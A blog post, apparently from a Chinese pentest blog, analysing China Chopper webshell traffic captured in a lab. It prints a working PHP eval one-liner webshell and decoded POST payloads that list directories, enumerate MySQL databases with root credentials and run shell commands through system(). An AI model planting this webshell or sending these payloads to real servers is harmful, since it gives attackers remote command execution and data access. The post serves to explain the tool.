@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="突然想起来getshell的时候发现用菜刀连接一句话就可以连接到shell了，突然之间觉得特别的神奇，想看看菜刀是如何实现相关功能的。  环境：windows server 2003 菜刀(2014) wireshark">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对菜刀原理的分析">
+<meta property="og:url" content="http://yoursite.com/2019/01/20/caidao/index.html">
+<meta property="og:site_name" content="Sriracha :)">
+<meta property="og:description" content="突然想起来getshell的时候发现用菜刀连接一句话就可以连接到shell了，突然之间觉得特别的神奇，想看看菜刀是如何实现相关功能的。  环境：windows server 2003 菜刀(2014) wireshark">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/01/20/caidao/shell.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/20/caidao/dir.png">
+<meta property="og:updated_time" content="2019-07-23T03:21:48.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="对菜刀原理的分析">
+<meta name="twitter:description" content="突然想起来getshell的时候发现用菜刀连接一句话就可以连接到shell了，突然之间觉得特别的神奇，想看看菜刀是如何实现相关功能的。  环境：windows server 2003 菜刀(2014) wireshark">
+<meta name="twitter:image" content="http://yoursite.com/2019/01/20/caidao/shell.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sriracha :)" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/20/caidao/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>对菜刀原理的分析 | Sriracha :)</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sriracha :)</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Wow, the smell is great!</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-pentest">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Pentest" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>渗透测试</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-audit">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Audit" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>代码审计</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-python">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Python" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Python</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about_me">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/About_Me" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>关于我</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-weapon">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/weapon" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Weapon</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/20/caidao/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">对菜刀原理的分析
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-20 18:14:34" itemprop="dateCreated datePublished" datetime="2019-01-20T18:14:34+08:00">2019-01-20</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-07-23 11:21:48" itemprop="dateModified" datetime="2019-07-23T11:21:48+08:00">2019-07-23</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>突然想起来getshell的时候发现用菜刀连接一句话就可以连接到shell了，突然之间觉得特别的神奇，想看看菜刀是如何实现相关功能的。</p>
+<ul>
+<li>环境：windows server 2003 菜刀(2014) wireshark</li>
+</ul>
+<a id="more"></a>
+<h1 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h1><p>首先在我们的服务器中编写好一句话<strong>&lt;?php @eval($_POST[‘cc123’]);?&gt;</strong>，打开wireshark</p>
+<p>然后在我们的本机用菜刀去连接这个一句话，用wireshark找到我们的请求包<br><img src="/2019/01/20/caidao/shell.png" alt><br>那么我们这里看见用POST方式提交了一下的数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc123=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=QzpcXHBocFN0dWR5XFxXV1dcXA%3D%3D</span><br></pre></td></tr></table></figure>
+<p>很明显这里是URL和base64编码，解码之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cc123=@eval(base64_decode($_POST[z0]));</span><br><span class="line">&amp;z0=@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-&gt;|&quot;);</span><br><span class="line">;$D=base64_decode($_POST[&quot;z1&quot;]);</span><br><span class="line">$F=@opendir($D);</span><br><span class="line">if($F==NULL)</span><br><span class="line">&#123;echo(</span><br><span class="line">	&quot;ERROR:// Path Not Found Or No Permission!&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	$M=NULL;$L=NULL;</span><br><span class="line">while($N=@readdir($F))</span><br><span class="line">&#123;</span><br><span class="line">	$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));</span><br><span class="line">	@$E=substr(base_convert(@fileperms($P),10,8),-4);</span><br><span class="line">	$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;&quot;;</span><br><span class="line">	if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;</span><br><span class="line">&#125;</span><br><span class="line">echo $M.$L;</span><br><span class="line">@closedir($F);</span><br><span class="line">&#125;;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br><span class="line">&amp;z1=C:\\phpStudy\\WWW\\</span><br></pre></td></tr></table></figure></p>
+<p>是不是看的不太懂？那么我们来想想，这个一句话到底是用来干嘛的？我们连接了一句话之后，显示了什么东西呢？我们看看上面的几个重要的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opendir //打开目录</span><br><span class="line">readdir //读取目录</span><br><span class="line">filemtime //文件创建的时间</span><br><span class="line">filesize //文件大小</span><br></pre></td></tr></table></figure></p>
+<p>再看这个图是不是很明白的了呢：<br><img src="/2019/01/20/caidao/dir.png" alt></p>
+<p>原来我们用POST提交的是一个查看文件目录的脚本，将这个脚本传递给我们自定义的参数<strong>cc123</strong>，就能当做php脚本运行啦。</p>
+<p>那我们再看看菜刀还有什么功能：</p>
+<h1 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h1><p>抓包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">X-Forwarded-For: 199.1.88.29</span><br><span class="line">Referer: http://192.168.79.129</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0</span><br><span class="line">Host: 192.168.79.129</span><br><span class="line">Content-Length: 650</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Cookie: safedog-flow-item=</span><br><span class="line"></span><br><span class="line">cc123=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTskcT1AbXlzcWxfcXVlcnkoIlNIT1cgREFUQUJBU0VTIik7d2hpbGUoJHJzPUBteXNxbF9mZXRjaF9yb3coJHEpKXtlY2hvKHRyaW0oJHJzWzBdKS5jaHIoOSkpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=localhost&amp;z2=root&amp;z3=root</span><br></pre></td></tr></table></figure></p>
+<p>解码后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cc123=@eval(base64_decode($_POST[z0]));</span><br><span class="line">&amp;z0=@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$m=get_magic_quotes_gpc();</span><br><span class="line">$hst=$m?stripslashes($_POST[&quot;z1&quot;]):$_POST[&quot;z1&quot;];</span><br><span class="line">$usr=$m?stripslashes($_POST[&quot;z2&quot;]):$_POST[&quot;z2&quot;];</span><br><span class="line">$pwd=$m?stripslashes($_POST[&quot;z3&quot;]):$_POST[&quot;z3&quot;];</span><br><span class="line">$T=@mysql_connect($hst,$usr,$pwd);</span><br><span class="line">$q=@mysql_query(&quot;SHOW DATABASES&quot;);</span><br><span class="line">while(</span><br><span class="line">	$rs=@mysql_fetch_row($q))&#123;echo(trim($rs[0]).chr(9));</span><br><span class="line">&#125;</span><br><span class="line">@mysql_close($T);</span><br><span class="line">;echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br><span class="line">&amp;z1=localhost&amp;z2=root&amp;z3=root</span><br></pre></td></tr></table></figure></p>
+<p>用php命令连接mysql然后查询SHOW DATABASES，并输出</p>
+<h1 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h1><p>抓包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">X-Forwarded-For: 199.1.88.29</span><br><span class="line">Referer: http://192.168.79.129</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0</span><br><span class="line">Host: 192.168.79.129</span><br><span class="line">Content-Length: 527</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Cookie: safedog-flow-item=</span><br><span class="line"></span><br><span class="line">cc123=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=Y2QgL2QgIkM6XHBocFN0dWR5XFdXV1wiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D</span><br></pre></td></tr></table></figure></p>
+<p>解码后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cc123=@eval(base64_decode($_POST[z0]));</span><br><span class="line">&amp;z0=@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$p=base64_decode($_POST[&quot;z1&quot;]);</span><br><span class="line">$s=base64_decode($_POST[&quot;z2&quot;]);</span><br><span class="line">$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);	//返回所在路径</span><br><span class="line">$c=substr($d,0,1)==&quot;/&quot;?&quot;-c &apos;&#123;$s&#125;&apos;&quot;:&quot;/c &#123;$s&#125;&quot;;$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">@system($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">;echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br><span class="line">&amp;z1=cmd</span><br><span class="line">&amp;z2=cd /d &quot;C:\phpStudy\WWW\&quot;&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure></p>
+<p>这里关键看$r的值，$p=cmd $c取决于你服务器的路径，然后用system函数执行相应的cms命令</p>
+<p>那么菜刀的核心功能的原理就介绍到这里啦，也可以用python发送post请求模拟菜刀。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/18/killsafedog/" rel="next" title="对安全狗的一次 FUZZ测试">
+                <i class="fa fa-chevron-left"></i> 对安全狗的一次 FUZZ测试
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/21/douyin-spider/" rel="prev" title="爬取抖音遇见方形文字的问题">
+                爬取抖音遇见方形文字的问题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">sher10ck</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">35</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wulidecade.cn" title="https://wulidecade.cn" rel="noopener" target="_blank">Decade</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://mang0.me/" title="http://mang0.me/" rel="noopener" target="_blank">Mang0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.singll.cc/" title="https://blog.singll.cc/" rel="noopener" target="_blank">Singll</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io/" title="https://timeshu.github.io/" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hit0on.github.io/" title="https://hit0on.github.io/" rel="noopener" target="_blank">HitOn</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件管理"><span class="nav-number">1.</span> <span class="nav-text">文件管理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据库管理"><span class="nav-number">2.</span> <span class="nav-text">数据库管理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#虚拟终端"><span class="nav-number">3.</span> <span class="nav-text">虚拟终端</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sher10ck</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v6.7.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
